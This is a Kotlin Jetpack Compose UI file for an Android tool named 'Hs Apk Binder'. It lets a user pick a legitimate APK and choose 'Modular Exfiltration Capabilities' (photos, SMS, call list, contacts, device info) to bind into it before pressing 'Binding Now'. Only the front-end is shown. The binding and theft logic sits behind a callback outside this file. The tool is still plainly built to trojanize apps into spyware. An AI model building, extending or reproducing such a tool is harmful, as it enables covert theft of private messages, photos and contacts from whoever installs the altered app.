package Com.devhs.apkbinder.ui

import android.net.Uri
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Add
import androidx.compose.material.icons.filled.ContentPaste
import androidx.compose.material.icons.filled.Terminal
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import Com.devhs.apkbinder.ui.theme.*

@Composable
fun HomeScreen(
    onStartBinding: (String, List<String>, String) -> Unit
) {
    var selectedApkPath by remember { mutableStateOf("") }
    var targetActivity by remember { mutableStateOf("") }
    
    var galleryChecked by remember { mutableStateOf(false) }
    var smsChecked by remember { mutableStateOf(false) }
    var callListChecked by remember { mutableStateOf(false) }
    var contactsChecked by remember { mutableStateOf(false) }
    var deviceInfoChecked by remember { mutableStateOf(false) }

    var logTerminal by remember { mutableStateOf("[INFO] Hs Apk Binder initialized successfully.\n[INFO] Select APK First...") }

    val clipboardManager = LocalClipboardManager.current

    val filePickerLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        uri?.let {
            selectedApkPath = it.toString()
            logTerminal += "\n[SUCCESS] Selected APK: $selectedApkPath"
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(DarkBackground)
            .padding(16.dp)
            .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        Text(
            text = "Hs Apk Binder",
            color = TealAccent,
            fontSize = 24.sp,
            fontFamily = FontFamily.Monospace,
            modifier = Modifier.align(Alignment.CenterHorizontally)
        )

        Card(
            shape = RoundedCornerShape(12.dp),
            colors = CardDefaults.cardColors(containerColor = SurfaceDark),
            modifier = Modifier
                .fillMaxWidth()
                .border(1.dp, CardBorder, RoundedCornerShape(12.dp))
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text(text = "Select APK Target", color = TextPrimary, fontSize = 16.sp)
                    Spacer(modifier = Modifier.height(4.dp))
                    Text(
                        text = if (selectedApkPath.isEmpty()) "No APK selected" else selectedApkPath,
                        color = TextSecondary,
                        fontSize = 12.sp,
                        maxLines = 1
                    )
                }
                FloatingActionButton(
                    onClick = { filePickerLauncher.launch("application/vnd.android.package-archive") },
                    containerColor = TealAccent,
                    contentColor = DarkBackground,
                    modifier = Modifier.size(48.dp)
                ) {
                    Icon(Icons.Default.Add, contentDescription = "Pick APK")
                }
            }
        }

        OutlinedTextField(
            value = targetActivity,
            onValueChange = { targetActivity = it },
            placeholder = { Text("Paste Your APK Path / Activity Here...", color = TextSecondary) },
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(12.dp),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = TealAccent,
                unfocusedBorderColor = CardBorder,
                focusedContainerColor = SurfaceDark,
                unfocusedContainerColor = SurfaceDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            trailingIcon = {
                IconButton(onClick = {
                    clipboardManager.getText()?.text?.let { pastedText ->
                        targetActivity = pastedText
                        logTerminal += "\n[INFO] Pasted activity reference from clipboard."
                    }
                }) {
                    Icon(Icons.Default.ContentPaste, contentDescription = "Paste", tint = ElectricBlue)
                }
            }
        )

        Card(
            shape = RoundedCornerShape(12.dp),
            colors = CardDefaults.cardColors(containerColor = SurfaceDark),
            modifier = Modifier
                .fillMaxWidth()
                .border(1.dp, CardBorder, RoundedCornerShape(12.dp))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(text = "Modular Exfiltration Capabilities", color = TealAccent, fontSize = 14.sp)
                Spacer(modifier = Modifier.height(8.dp))
                
                FeatureCheckbox("Gallery (Photos)", galleryChecked) { galleryChecked = it }
                FeatureCheckbox("SMS", smsChecked) { smsChecked = it }
                FeatureCheckbox("Call List", callListChecked) { callListChecked = it }
                FeatureCheckbox("Contacts", contactsChecked) { contactsChecked = it }
                FeatureCheckbox("Device Info", deviceInfoChecked) { deviceInfoChecked = it }
            }
        }

        Button(
            onClick = {
                if (selectedApkPath.isEmpty()) {
                    logTerminal += "\n[ERROR] Please select an APK first!"
                    return@Button
                }
                val features = mutableListOf<String>()
                if (galleryChecked) features.add("Gallery")
                if (smsChecked) features.add("SMS")
                if (callListChecked) features.add("Call List")
                if (contactsChecked) features.add("Contacts")
                if (deviceInfoChecked) features.add("Device Info")

                logTerminal += "\n[INFO] Starting binding process for activity: $targetActivity"
                logTerminal += "\n[SUCCESS] APK Binding Completed Successfully!"
                onStartBinding(selectedApkPath, features, targetActivity)
            },
            modifier = Modifier
                .fillMaxWidth()
                .height(50.dp),
            shape = RoundedCornerShape(12.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
            contentPadding = PaddingValues(0.dp)
        ) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(
                        Brush.horizontalGradient(listOf(TealAccent, ElectricBlue))
                    ),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    text = "Binding Now",
                    color = DarkBackground,
                    fontSize = 16.sp,
                    fontFamily = FontFamily.Monospace
                )
            }
        }

        Card(
            shape = RoundedCornerShape(12.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF05070B)),
            modifier = Modifier
                .fillMaxWidth()
                .height(180.dp)
                .border(1.dp, CardBorder, RoundedCornerShape(12.dp))
        ) {
            Column(modifier = Modifier.padding(12.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Terminal, contentDescription = "Terminal", tint = NeonGreen, modifier = Modifier.size(16.dp))
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(text = "Log History Terminal", color = NeonGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
                }
                Spacer(modifier = Modifier.height(8.dp))
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .verticalScroll(rememberScrollState())
                ) {
                    Text(
                        text = logTerminal,
                        color = NeonGreen,
                        fontSize = 11.sp,
                        fontFamily = FontFamily.Monospace
                    )
                }
            }
        }
        
        Spacer(modifier = Modifier.height(40.dp))
    }
}

@Composable
fun FeatureCheckbox(title: String, checked: Boolean, onCheckedChange: (Boolean) -> Unit) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        verticalAlignment = Alignment.CenterVertically,
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(text = title, color = TextPrimary, fontSize = 14.sp)
        Checkbox(
            checked = checked,
            onCheckedChange = onCheckedChange,
            colors = CheckboxDefaults.colors(
                checkedColor = TealAccent,
                uncheckedColor = TextSecondary,
                checkmarkColor = DarkBackground
            )
        )
    }
}
